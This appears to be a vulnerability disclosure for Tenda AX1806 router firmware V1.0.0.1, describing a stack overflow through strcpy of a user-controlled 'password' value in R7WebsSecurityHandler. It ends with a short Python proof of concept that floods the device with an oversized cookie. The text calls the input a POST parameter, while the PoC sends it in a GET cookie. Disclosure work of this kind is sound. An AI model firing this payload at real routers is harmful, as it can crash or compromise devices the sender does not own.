## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3422.html

## Affected version

AX1806 V1.0.0.1

## Vulnerability details

The Tenda AX1806 V1.0.0.1 firmware has a stack overflow vulnerability in the `R7WebsSecurityHandler` function. The `v31` variable receives the `password` parameter from a POST request and is later assigned to the `dest` variable, which is fixed at 128 bytes. However, since the user can control the input of `password`, the statement `strcpy(dest, v31);` can cause a buffer overflow. The user-provided `password` can exceed the capacity of the `dest` array, triggering this security vulnerability.

![image-20240418170944495](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240418170944495.png)

![image-20240418170926191](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240418170926191.png)

![image-20240418170933555](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240418170933555.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://%s/goform/execCommand"%ip
cookie = {"Cookie":"password=" + "A"*1000}
ret = requests.get(url=url,cookies=cookie)
print(ret.text)
```

![image-20240415125733742](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240415125733742.png)